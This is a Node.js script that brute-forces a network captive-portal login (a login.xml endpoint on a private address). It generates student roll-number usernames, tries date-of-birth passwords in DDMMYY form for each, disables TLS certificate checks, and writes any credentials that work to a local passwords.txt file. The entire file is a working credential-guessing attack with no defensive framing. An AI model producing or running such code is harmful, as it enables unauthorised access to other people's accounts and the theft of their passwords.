const request = require('request');
const url = "https://172.16.1.1:8090";
const successMessage = 'You have successfully logged in';
const parseString = require('xml2js').parseString;
const fs = require('fs');

const postRequest = function (rollNo, pwd, out) {
    request.post({
        url: `${url}/login.xml`,
        rejectUnauthorized: false,
        form: {
            mode: '191',
            password: pwd,
            username: rollNo,
            a: '1519891235551',
            producttype: '0'
        }
    }, (err, res) => {
        if (err) {
            return console.log(err);
        }
        parseString(res.body, (err, res) => {
            if (err) {
                return console.log(err);
            }
            const resMsg = res['requestresponse']['message'][0];
            if (successMessage === resMsg) {
                out.flag = true;
                console.log('Success');
                console.log(rollNo, pwd);
                let obj = {
                    username: rollNo,
                    password: pwd
                };
                obj = JSON.stringify(obj);
                fs.appendFile('passwords.txt', obj + '\n', 'utf8', function (err) {
                    if (err) throw err;
                    console.log('Saved!');
                });
            }
        });
    })
}

function main() {
    for (let roll = 1; roll < 3; roll++) { // Roll No
        let out = {
            flag: false
        };
        let rollNo = `btech10`;
        if (roll < 10) {
            rollNo += `00${roll}`;
        } else if (roll < 100) {
            rollNo += `0${roll}`;
        } else {
            rollNo += `${roll}`;
        }
        rollNo += `19`
        for (let i = 1; i < 32; i++) {  // Date
            let pwd = `${i}`;
            let savPwd = pwd;
            for (let j = 1; j < 13; j++) {  // Month
                if (j < 10) {
                    pwd += `0${j}`;
                }
                else {
                    pwd += `${j}`;
                }
                let savPwd2 = pwd;
                for (let k = 2001; k < 2002; k++) {  // Year
                    pwd += k.toString().substr(2);
                    postRequest(rollNo, pwd, out);
                    if (out.flag)
                        break;
                    pwd = savPwd2;
                }
                if (out.flag)
                    break;
                pwd = savPwd;
            }
        }
    }
}

main();